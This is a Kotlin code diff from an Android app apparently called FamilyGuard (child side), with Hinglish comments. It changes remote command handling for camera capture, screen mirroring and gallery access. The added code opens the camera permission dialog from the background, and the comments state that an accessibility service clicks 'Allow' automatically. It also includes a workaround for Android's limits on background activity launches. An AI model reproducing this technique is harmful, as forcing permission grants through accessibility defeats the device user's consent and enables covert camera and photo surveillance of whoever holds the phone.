@@ -159,6 +159,18 @@ object CommandHandler {
 
             "camera" -> {
                 val front = params.get("facing")?.takeIf { it.isJsonPrimitive }?.asString == "front"
+                // FRESH-INSTALL FIX (vc12): CAMERA permission missing ho to pehle
+                // background me request karo (a11y Allow khud click karega) —
+                // pehle sirf "camera unavailable" aata tha aur request KABHI nahi
+                // hoti thi, isliye wizard ka cam step miss hua ho to camera
+                // permanently dead rehta tha.
+                if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA)
+                    != PackageManager.PERMISSION_GRANTED
+                ) {
+                    requestCameraPerm(ctx)
+                    data.addProperty("error", "camera permission auto-requested — 5 sec me dobara tap karo")
+                    return Pair(false, data)
+                }
                 // Android 14/15: camera FGS type bhi while-in-use hai — poke upgrade
                 // ke bina background se openCamera fail/silent hota hai.
                 if (Build.VERSION.SDK_INT >= 30) {
@@ -257,6 +269,16 @@ object CommandHandler {
                 ) {
                     data.addProperty("capturePending", true)
                 }
+                // FRESH-INSTALL DIAG (vc12): gallery/camera permission bhi report
+                // karo — teeno (mirror/gallery/camera) a11y par depend karte hain,
+                // aur Phone check me ye rows na the to parent ko nahi pata tha ki
+                // kya missing hai.
+                data.addProperty("galleryPerm", GalleryFetcher.hasPerm(ctx))
+                data.addProperty(
+                    "cameraPerm",
+                    ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA)
+                        == PackageManager.PERMISSION_GRANTED
+                )
                 data.addProperty("frames", MirrorManager.frameCount)
                 val ago = MirrorManager.lastFrameAgoSec()
                 if (ago != null) data.addProperty("lastFrameAgoSec", ago)
@@ -618,10 +640,41 @@ object CommandHandler {
         }
     }
 
-    /** Gallery permission background request — transparent activity runtime
-     *  dialog kholti hai, EnforcementService "gallery" step par Allow khud
+    /** Camera permission background request — transparent activity runtime
+     *  dialog kholti hai, EnforcementService "cam" step par Allow khud
      *  click karta hai. Start BAL-safe (a11y context) — start fail ho to
      *  tap-able notification fallback (foreground tap hamesha legal). */
+    private fun requestCameraPerm(ctx: Context) {
+        val ok = startActivityBalSafe(ctx) {
+            android.content.Intent(ctx, com.familyguard.child.ui.CameraPermActivity::class.java)
+        }
+        if (!ok) {
+            runCatching {
+                val pi = PendingIntent.getActivity(
+                    ctx, 9007,
+                    android.content.Intent(ctx, com.familyguard.child.ui.CameraPermActivity::class.java),
+                    PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+                )
+                ensureChannel(ctx)
+                val n = NotificationCompat.Builder(ctx, CH_FG)
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setContentTitle("Camera permission")
+                    .setContentText("Tap to allow camera access")
+                    .setContentIntent(pi)
+                    .setAutoCancel(true)
+                    .build()
+                if (
+                    ContextCompat.checkSelfPermission(ctx, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED ||
+                    Build.VERSION.SDK_INT < 33
+                ) {
+                    NotificationManagerCompat.from(ctx).notify(9008, n)
+                }
+            }
+        }
+    }
+
+    /** Gallery permission background request — CameraPermActivity ka
+     *  counterpart, same BAL-safe + notification-fallback pattern. */
     private fun requestGalleryPerm(ctx: Context) {
         val ok = startActivityBalSafe(ctx) {
             android.content.Intent(ctx, com.familyguard.child.ui.GalleryPermActivity::class.java)
